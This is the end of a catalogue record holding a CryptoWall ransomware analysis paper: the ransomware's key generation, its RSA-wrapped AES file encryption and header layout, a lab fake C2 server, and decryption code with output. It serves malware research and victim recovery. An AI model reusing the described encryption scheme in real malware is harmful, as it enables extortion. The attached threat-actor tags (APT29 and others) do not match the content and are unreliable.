the generated key is going to`\n[be AES-256 as seen in MS-DOCS. Once the](https://docs.microsoft.com/en-us/windows/win32/seccrypto/alg-id) `hKey address to which the function copies the`\nhandle of the newly generated key is populated, `CryptGetKeyParam will be used to make`\nthe key and transfer it into `pbData ; a pointer to a buffer that receives the data. One last call`\nin this function we labeled as `GenerateAESKey() gets called which is` `CryptExportKey .`\nThis will take the handle to the key to be exported and pass it the function, and the function\nreturns a key BLOB. The second parameter of the `GenerateAESKey() will hold the`\n```\naes_key .\n\n```\nThe next call is one of the most important ones to understand how eventually we can decrypt\nthe files that CryptoWall infected. `EncryptAESKey() uses the pointer to`\n```\nDuplicateKeyStruct->rsa_key to encrypt our AES key into a 256 byte blob. Exploring\n\n```\ninside this function call is fairly simple; it uses `CryptDuplicateKey and` `CryptEncrypt to`\ntake our public RSA 2048-bit key from earlier, our newly generated AES key to duplicate\nboth keys to save for later, and encrypt the buffer. The fifth parameter is our data out in this\ncase and once the function returns, what we labeled as `encrypted_AESkey_buffer will`\nhold our RSA encrypted key.\n\nAt around address `004124A5, you will see two calls to` `WriteFileA . The first call will`\nmove the `16 byte MD5 hash at the top of the victim file, and the second call will write out`\nthe `256 bytes of encrypted key buffer right below the hash.`\n\n\n-----\n\nScreenshot shows 128 byte encrypted key buffer, but it was a copy mistake; Supposed to be\n256 bytes of encrypted key text.\nThe picture above shows what an example file will look like up until this stage of the\ninfection. The plaintext is still intact, but the headers now hold the hash of the file and the\nencrypted AES key used to encrypt the plaintext in the next phase. `ReadFileA will shortly`\nget called at `0x0041261B, which will read out everything after the header of the file to start`\nthe encryption process.\n\n\n-----\n\nNow that `272 bytes belong to the header, anything after that we can assume is free range`\nfor the next function to deal with. We don’t really need to deep dive too much into what\n```\nDuplicateAESKey_And_Encrypt() does as it is pretty self explanatory. The file contents\n\n```\nare encrypted using the already generated AES key from above that was passed into the\n```\nHCRYPTKEY *hKey variable. The sixth parameter of this function is the pointer which will\n\n```\ncontain the encrypted buffer. At this point the ransomware will replace the plaintext with an\nencrypted blob, and the AES key is free’d from memory.\n\nExample of a fully encrypted file\nAfter the file is finished being processed, the loop will continue until every allow listed file\ntype on disk is encrypted.\n\n## Decrypting Victim Files\n\nUnfortunately in this case, it is only possible to write a decryption algorithm if you know the\nprivate key used which is generated on the C2 side. This is going to be a two step process\nas in order to decrypt the file contents, we need to decrypt the AES key that has been RSA\n\n\n-----\n\nencrypted.\n\nThe [fake C2 server I wrote also includes an area where a private key is generated at the](https://github.com/ryancor/CryptoWall_Analysis/blob/master/fake_c2_i2p_server.py#L37)\nsame time that the public key is generated. So in my case, all encrypted files on my VM are\nable to be decrypted.\n\n**Side Note: In order to run this C2 server, you have to place the malware’s hardcoded I2P**\naddresses in `/etc/hosts on Windows. Then make sure the server has started before`\nexecuting the malware as there will be a lot of initial verification going back and forth\nbetween the malware and ‘C2’ to ensure its legitimacy. Your file should look like this:\n```\n127.0.0.1 proxy1-1-1.i2p127.0.0.1 proxy2-2-2.i2p\n\n```\nAnother reason why we un the fake C2 server before executing the malware is so we don’t\nend up in some dead lock state. The output from our server will look something like this:\n```\nC:\\CryptoWall\\> python.exe fake_c2_i2p_server.py\n* Serving Flask app \"fake_c2_server\" (lazy loading)\n127.0.0.1 - - [31/Mar/2020 15:10:06] \"[33mGET / HTTP/1.1� [0m\" 404 -�\nData Received from CryptoWall Binary:\n-----------------------------[!] Found URI Header: 93n14chwb3qpm\n[+] Created key from URI: 13349bchmnpqw\n[!] Found ciphertext:\nff977e974ca21f20a160ebb12bd99bd616d3690c3f4358e2b8168f54929728a189c8797bfa12cfa031ee9c\n[+] Recovered plaintext:\nb'{1|crypt1|C6B359277232C8E248AFD89C98E96D65|0|2|1||55.59.84.254}'\n[+] Sending encrypted data blob back to cryptowall process127.0.0.1 - - [31/Mar/2020\n15:11:52] \"[37mPOST /93n14chwb3qpm HTTP/1.1� [0m\" 200�\n\n```\nStep by step, the first thing we have to do is write a program that imports the private key file.\nI used C++ for this portion because for the life of me I could not figure out how to mimic the\n```\nCryptDecodeObjectEx API call that decodes the key in a X509_ASN_ENCODING and\nPKCS_7_ASN_ENCODING format. Once you have the key blob from this function, we can use\n\n```\nthis function as the malware does and call `CryptImportKey, but this time it is a private key`\nand not a public key ;). Since the first `16 bytes of the victim file contains the MD5 hash of`\nthe unencrypted file, we know we can skip that part and focus on the `256 bytes after that`\npart of the header. The block size is going be `256 bytes and AES offset will be` `272, since`\nthat will be the last byte needed in the cryptographic equation. Once we get the blob, it is\nnow okay to call `CryptDecrypt and print out the` `32 byte key blob:`\n\n\n-----\n\n```\nif (!CryptDecrypt(hKey, NULL, FALSE, 0, keyBuffer, &bytesRead)) {     printf(\n[-] CryptDecrypt failed with error 0x%.8X\\n\",   GetLastError());     return\nFALSE; }  printf(\"[+] Decrypted AES Key => \"); for(int i = 0; i < bytesRead; i++) \n{    printf(\"%02x\", keyBuffer[i]); }\n\n```\n[You can find the whole script here. Now that we are half way there and we have an AES key,](https://github.com/ryancor/CryptoWall_Analysis/blob/master/In_Progress/decrypt_aes_key.cpp)\nthe last thing to do is write a simple python script that will take that key / encrypted file and\ndecrypt all remaining contents of it after the 272nd byte.\n```\nenc_data_remainder = file_data[272:]cipher = AES.new(aes_key, AES.MODE_ECB)    \nplaintext = cipher.decrypt(enc_data_remainder)\n\n```\n[The script to perform this action is in the same folder on Github. If you want to see how the](https://github.com/ryancor/CryptoWall_Analysis/blob/master/In_Progress/decrypt_file.py)\nwhole thing looks from start to finish, it will go like this:\n\n➜ decrypt_aes_key.exe priv_key_1.pem loveme.txt\n```\n[+] Initialized crypto provider\n[+] Successfully imported private key from PEM file\n[!] Extracted encrypted AES keys from file\n[+] Decrypted AES Key =>\n08020000106600002000000040b4247954af27637ce4f7fabfe1ccfc6cd55fc724caa840f82848ea4800b3\n[+] Successfully decrypted key from file\n\n```\n➜ python decrypt_file.py loveme.txt\n```\n40b4247954af27637ce4f7fabfe1ccfc6cd55fc724caa840f82848ea4800b320[+] Decrypting\nfile[+] Found hash header => e91049c35401f2b4a1a131bd992df7a6[+] Plaintext from file:\nb'\"hello world\" \\r\\n\\'\n\n## Conclusion\n\n```\nOverall this was one of the biggest leading cyber threats back in 2013, and the threat actors\nbehind this malicious virus have shown their years of experience when it comes to\nengineering a ransomware such as this.\n\nAlthough this ransomware is over 6 years old, it still fascinated me so much to reverse\nengineer this virus that I wanted to share all the tooling I have wrote for it. Every step of the\nway their was another challenge to overcome, whether it was knowing what the malware\nexpected the encrypted payload to look like coming back from the C2, figuring out how to\ndecrypt their C2 I2P servers using RC4, decompressing the ransomware note using some\nhard to mimic LZNT1 algorithm, or even understanding their obscure way of generating\ndomain URI paths… it was all around a gigantic puzzle for a completionist engineer like\nmyself.\n\nHere is the repository that contains all the programs I wrote that helped me research\n[CryptoWall.](https://github.com/ryancor/CryptoWall_Analysis)\n\n\n-----\n\nThank you for following along! I hope you enjoyed it as much as I did. If you have any\nquestions on this article or where to find the challenge, please DM me at my Instagram:\n@hackersclub or Twitter: @ringoware\n\nHappy Hunting :)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-11-23 - Genetic Analysis of CryptoWall Ransomware.pdf"
    ],
    "report_names": [
        "2020-11-23 - Genetic Analysis of CryptoWall Ransomware.pdf"
    ],
    "threat_actors": [
        {
            "id": "b740943a-da51-4133-855b-df29822531ea",
            "created_at": "2022-10-25T15:50:23.604126Z",
            "updated_at": "2025-03-27T02:00:55.505366Z",
            "deleted_at": null,
            "main_name": "Equation",
            "aliases": [
                "Equation"
            ],
            "source_name": "MITRE:Equation",
            "tools": null,
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "5b748f86-ac32-4715-be9f-6cf25ae48a4e",
            "created_at": "2024-06-04T02:03:07.956135Z",
            "updated_at": "2025-03-27T02:05:17.407352Z",
            "deleted_at": null,
            "main_name": "IRON HEMLOCK",
            "aliases": [
                "ATK7 ",
                "Blue Kitsune ",
                "Cozy Bear ",
                "The Dukes",
                "UNC2452 ",
                "YTTRIUM ",
                "APT29 "
            ],
            "source_name": "Secureworks:IRON HEMLOCK",
            "tools": [
                " CozyCar",
                " CozyDuke",
                " DiefenDuke",
                " FatDuke",
                " HAMMERTOSS",
                " LiteDuke",
                " MiniDuke",
                " OnionDuke",
                " PolyglotDuke",
                " RegDuke",
                " RegDuke Loader",
                " SeaDuke",
                " Sliver",
                "CosmicDuke"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "20d3a08a-3b97-4b2f-90b8-92a89089a57a",
            "created_at": "2022-10-25T15:50:23.548494Z",
            "updated_at": "2025-03-27T02:00:55.49688Z",
            "deleted_at": null,
            "main_name": "APT29",
            "aliases": [
                "APT29",
                "IRON RITUAL",
                "IRON HEMLOCK",
                "NobleBaron",
                "Dark Halo",
                "NOBELIUM",
                "UNC2452",
                "YTTRIUM",
                "The Dukes",
                "Cozy Bear",
                "CozyDuke",
                "SolarStorm",
                "Blue Kitsune",
                "UNC3524",
                "Midnight Blizzard"
            ],
            "source_name": "MITRE:APT29",
            "tools": [
                "PinchDuke",
                "ROADTools",
                "WellMail",
                "CozyCar",
                "Mimikatz",
                "Tasklist",
                "OnionDuke",
                "FatDuke",
                "POSHSPY",
                "EnvyScout",
                "SoreFang",
                "GeminiDuke",
                "GoldMax",
                "FoggyWeb",
                "SDelete",
                "PolyglotDuke",
                "AADInternals",
                "MiniDuke",
                "SeaDuke",
                "Sibot",
                "RegDuke",
                "CloudDuke",
                "GoldFinder",
                "AdFind",
                "PsExec",
                "NativeZone",
                "Systeminfo",
                "ipconfig",
                "Impacket",
                "Cobalt Strike",
                "PowerDuke",
                "QUIETEXIT",
                "HAMMERTOSS",
                "BoomBox",
                "CosmicDuke",
                "WellMess",
                "VaporRage",
                "LiteDuke"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "46b3c0fc-fa0c-4d63-a38a-b33a524561fb",
            "created_at": "2023-01-06T13:46:38.393409Z",
            "updated_at": "2025-03-27T02:00:02.822155Z",
            "deleted_at": null,
            "main_name": "APT29",
            "aliases": [
                "The Dukes",
                "Minidionis",
                "Grizzly Steppe",
                "G0016",
                "Blue Kitsune",
                "BlueBravo",
                "SeaDuke",
                "Cloaked Ursa",
                "YTTRIUM",
                "ATK7",
                "Nobelium",
                "UAC-0029",
                "Group 100",
                "COZY BEAR",
                "IRON HEMLOCK",
                "TA421",
                "ITG11"
            ],
            "source_name": "MISPGALAXY:APT29",
            "tools": [
                "QUARTERRIG",
                "SNOWYAMBER",
                "HALFRIG"
            ],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "f27790ff-4ee0-40a5-9c84-2b523a9d3270",
            "created_at": "2022-10-25T16:07:23.341684Z",
            "updated_at": "2025-03-27T02:02:09.74554Z",
            "deleted_at": null,
            "main_name": "APT 29",
            "aliases": [
                "APT 29",
                "ATK 7",
                "Blue Dev 5",
                "BlueBravo",
                "Cloaked Ursa",
                "CloudLook",
                "Cozy Bear",
                "Dark Halo",
                "Earth Koshchei",
                "Grizzly Steppe",
                "Group 100",
                "ITG11",
                "Iron Hemlock",
                "Iron Ritual",
                "Midnight Blizzard",
                "Minidionis",
                "Nobelium",
                "NobleBaron",
                "Operation Ghost",
                "Operation Office monkeys",
                "Operation StellarParticle",
                "SilverFish",
                "Solar Phoenix",
                "SolarStorm",
                "StellarParticle",
                "TEMP.Monkeys",
                "The Dukes",
                "UNC2452",
                "UNC3524",
                "Yttrium"
            ],
            "source_name": "ETDA:APT 29",
            "tools": [
                "7-Zip",
                "ATI-Agent",
                "AdFind",
                "Agentemis",
                "AtNow",
                "BEATDROP",
                "BotgenStudios",
                "CEELOADER",
                "Cloud Duke",
                "CloudDuke",
                "CloudLook",
                "Cobalt Strike",
                "CobaltStrike",
                "CosmicDuke",
                "Cozer",
                "CozyBear",
                "CozyCar",
                "CozyDuke",
                "Danfuan",
                "EnvyScout",
                "EuroAPT",
                "FatDuke",
                "FoggyWeb",
                "GeminiDuke",
                "Geppei",
                "GoldFinder",
                "GoldMax",
                "GraphDrop",
                "GraphicalNeutrino",
                "GraphicalProton",
                "HAMMERTOSS",
                "HammerDuke",
                "LOLBAS",
                "LOLBins",
                "LiteDuke",
                "Living off the Land",
                "MagicWeb",
                "Mimikatz",
                "MiniDionis",
                "MiniDuke",
                "NemesisGemina",
                "NetDuke",
                "OnionDuke",
                "POSHSPY",
                "PinchDuke",
                "PolyglotDuke",
                "PowerDuke",
                "QUIETEXIT",
                "ROOTSAW",
                "RegDuke",
                "Rubeus",
                "SNOWYAMBER",
                "SPICYBEAT",
                "SUNSHUTTLE",
                "SeaDaddy",
                "SeaDask",
                "SeaDesk",
                "SeaDuke",
                "Sharp-SMBExec",
                "SharpView",
                "Sibot",
                "Solorigate",
                "SoreFang",
                "TinyBaron",
                "WINELOADER",
                "WellMail",
                "WellMess",
                "cobeacon",
                "elf.wellmess",
                "reGeorg",
                "tDiscoverer"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535590,
    "ts_updated_at": 1743041795,
    "ts_creation_date": 1653692320,
    "ts_modification_date": 1653692320,
    "files": {
        "pdf": "https://archive.orkl.eu/f2c8962cb51fb8ef0bf860c2c7ec424e69f1ba21.pdf",
        "text": "https://archive.orkl.eu/f2c8962cb51fb8ef0bf860c2c7ec424e69f1ba21.txt",
        "img": "https://archive.orkl.eu/f2c8962cb51fb8ef0bf860c2c7ec424e69f1ba21.jpg"
    }
}